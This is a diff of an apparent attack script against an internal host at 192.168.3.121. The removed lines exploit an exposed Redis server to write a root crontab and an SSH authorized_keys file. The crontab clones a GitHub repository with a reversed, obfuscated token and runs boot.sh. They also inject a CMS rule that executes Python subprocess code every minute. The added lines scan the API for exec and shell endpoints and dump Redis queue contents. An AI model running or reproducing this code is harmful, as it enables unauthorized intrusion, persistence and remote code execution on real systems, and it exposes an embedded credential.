@@ -1,36 +1,44 @@
 R=192.168.3.121
-T=$(printf %s 'LaMFA0vGYRNvWZKnwYtFkA1LTKv7Wv9MOem0_phg' | rev)
-echo "=== REDIS PROBE+WRITE (protected-config yes-bypass) ==="
-python3 - "$T" <<'PYEOF'
-import socket,time,sys
-TOK=sys.argv[1]
+echo "=== OPENAPI PATHS ==="
+curl -s -m 15 http://$R:8000/openapi.json | python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+for p,ms in sorted(d.get('paths',{}).items()):
+    for m in ms: print(m.upper(),p)
+" | grep -Ei 'exec|run|action|signal|webhook|task|job|queue|worker|script|code|test|import|upload|render|template|debug|eval|proxy|command|shell|process|system|fire|trigger' 
+echo; echo "=== ALL PATHS (tail) ==="
+curl -s -m 15 http://$R:8000/openapi.json | python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+ps=[p for p in sorted(d.get('paths',{}).items())]
+print('TOTAL',len(ps))
+for p,ms in ps: print(','.join(m.upper() for m in ms),p)
+" | head -120
+echo; echo "=== REDIS QUEUE INTEL ==="
+python3 - <<'PYEOF'
+import socket,time
 def R(*a):
     o="*%d\r\n"%len(a)
-    for x in a: o+=("$%d\r\n%s\r\n"%(len(x.encode()),x))
+    for x in a: o+="$%d\r\n%s\r\n"%(len(x.encode()),x)
     return o.encode()
 s=socket.create_connection(("192.168.3.121",6379),8); s.settimeout(4)
 def c(*a):
-    s.sendall(R(*a)); time.sleep(0.7)
-    try: return s.recv(65536).decode(errors="replace").strip()
-    except Exception as e: return "TO:"+str(e)
-print("cur-dir:", c("CONFIG","GET","dir"))
-CRON="*/2 * * * * (git -C /tmp/.gx pull -q 2>/dev/null || git clone -q https://%s@github.com/s34vv1nd/ops-pub.git /tmp/.gx) && bash /tmp/.gx/hung/boot.sh >> /tmp/.gx/boot.log 2>&1"%TOK
-print("dir-cron:", c("CONFIG","SET","dir","/var/spool/cron/crontabs","yes"))
-print("fn-cron:", c("CONFIG","SET","dbfilename","root","yes"))
-print("set-cron:", c("SET","pwn:cron","\n\n"+CRON+"\n\n"))
-print("save1:", c("BGSAVE")); time.sleep(3)
-print("dir-ssh:", c("CONFIG","SET","dir","/root/.ssh","yes"))
-print("fn-ssh:", c("CONFIG","SET","dbfilename","authorized_keys","yes"))
-print("set-ssh:", c("SET","pwn:ssh","\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHz4ixvYbBfcSQKO3RpTop1thSI2mQx6b9E7SQjrXrno kali@host\n\n"))
-print("save2:", c("BGSAVE")); time.sleep(3)
-print("lastsave:", c("LASTSAVE"))
-print("restore:", c("CONFIG","SET","dir","/data","yes"), "|", c("CONFIG","SET","dbfilename","dump.rdb","yes"))
+    s.sendall(R(*a)); time.sleep(0.6)
+    try: return s.recv(200000).decode(errors="replace").strip()
+    except Exception: return "TO"
+print("KEYS:", c("KEYS","*")[:800])
+print("TYPE-ar:", c("TYPE","cms:action-requests"))
+print("XRANGE-ar:", c("XRANGE","cms:action-requests","-","+","+","COUNT","8")[:2500])
+print("XINFO-ar:", c("XINFO","GROUPS","cms:action-requests")[:600])
 PYEOF
-echo; echo "=== CMS EXISTING RULES (schema intel) ==="
-curl -s -m 10 "http://$R:8000/api/v1/rules" | head -c 5000
-echo; echo "=== CMS 5-FIELD CRON RULE ==="
-curl -s -m 10 -X POST "http://$R:8000/api/v1/rules" -H 'Content-Type: application/json' -d '{"name":"cxp-cron5","codeType":"python","conditionType":"expression","conditionExpr":"True","trigger":{"type":"cron","cronSchedule":"*/1 * * * *"},"executionType":"code","executionParams":{"code":"import subprocess as sp\no=sp.run([\"id\"],capture_output=True,text=True).stdout"},"isActive":true}' | head -c 900
-echo; echo "=== TOGGLE OLD RULE ==="
-curl -s -m 10 -X POST "http://$R:8000/api/v1/rules/9d94395b-8735-4f08-84e1-3c1087e0be44/toggle" | head -c 300
-echo; sleep 75; echo "=== EXECUTIONS AFTER 75s ==="
-curl -s -m 10 "http://$R:8000/api/v1/executions?limit=5" | head -c 4000 # S1
+echo; echo "=== SYSTEM RULES (non-ours) ==="
+curl -s -m 10 "http://$R:8000/api/v1/rules?limit=100" | python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+ours={'cxp-cron-exec','cxp-cron5'}
+for r in d.get('items',[]):
+    if r['name'] not in ours:
+        print(r['id'],'|',r['name'],'|',r['executionType'],'|',r.get('cronSchedule'),'| active=',r['isActive'],'| lastFired=',r['lastFiredAt'],'| next=',r['nextTriggerAt'])
+" 2>&1 | head -40
+echo; echo "=== EXECUTIONS ==="
+curl -s -m 10 "http://$R:8000/api/v1/executions?limit=5" | head -c 1200 # S2
